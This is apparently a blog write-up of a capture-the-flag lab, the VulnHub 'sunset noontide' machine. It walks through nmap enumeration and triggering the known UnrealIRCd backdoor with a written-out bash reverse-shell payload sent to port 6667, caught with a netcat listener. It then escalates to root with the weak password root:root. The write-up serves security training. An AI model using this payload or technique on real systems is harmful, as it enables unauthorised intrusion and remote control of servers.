---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/sunset-noontide,531/)

# enumeration
Performing a simple `nmap` scan to identify the attack surface.

## nmap
```bash
$ nmap -Pn 192.168.156.120                                                                                                                                                                                                            1 ⨯
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-03 00:38 EST
Nmap scan report for 192.168.156.120
Host is up (0.027s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
6667/tcp open  irc

Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds
```

```bash
$ nmap -Pn -p6667 -sV 192.168.169.120
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-02 16:18 EST
Nmap scan report for 192.168.169.120
Host is up (0.11s latency).

PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
Service Info: Host: irc.foonet.com
```

Only an `IRC` service could be identified.

---

# exploitation
## scan for vulnerabilities
```bash
$ nmap -Pn -p6667 --script="irc*" 192.168.156.120
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-03 00:39 EST
Nmap scan report for 192.168.156.120
Host is up (0.025s latency).

PORT     STATE SERVICE
6667/tcp open  irc
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277

Nmap done: 1 IP address (1 host up) scanned in 17.52 seconds
```

```bash
$ searchsploit unrealirc backdoor
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                                                                                                              | linux/remote/16922.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

> The installed `IRC` server seems to be backdoored!
{: .prompt-info}

Reviewing the source code of the `metasploit` module reveals that a simple payload can be used to access the backdoor.  
![image](/images/sunsetnoontide1.png)

## get reverse shell
payload: ```AB;bash -c 'bash -i >& /dev/tcp/192.168.49.156/80 0>&1'```

### start listener on attacking machine
```bash
$ nc -lvp 80  
listening on [any] 80 ...
```

### trigger backdoor
```bash
$ nc 192.168.156.120 6667                             
:irc.foonet.com NOTICE AUTH :*** Looking up your hostname...
:irc.foonet.com NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
AB;bash -c 'bash -i >& /dev/tcp/192.168.49.156/80 0>&1'
```

### catch connect from target
```bash
$ nc -lvp 80  
listening on [any] 80 ...
192.168.156.120: inverse host lookup failed: Unknown host
connect to [192.168.49.156] from (UNKNOWN) [192.168.156.120] 48232
bash: cannot set terminal process group (396): Inappropriate ioctl for device
bash: no job control in this shell
server@noontide:~/irc/Unreal3.2$ whoami
whoami
server
```

---

# post exploitation
## get first flag
```bash
server@noontide:~$ cd /home/server
server@noontide:~$ ls
ls
irc
local.txt
server@noontide:~$ cat local.txt
cat local.txt
4******************************9
```

## privilege escalation

> The account `root` uses wek credentials: `root:root`.
{: .prompt-info}

```bash
server@noontide:~/irc/Unreal3.2$ su root
root@noontide:~/irc/Unreal3.2# whoami
whoami
root
```

---

## second flag
```bash
root@noontide:/tmp# cd /root
cd /root
root@noontide:~# ls
ls
proof.txt
root@noontide:~# cat proof.txt
cat proof.txt
3******************************2
```

Pwned! <@:-)
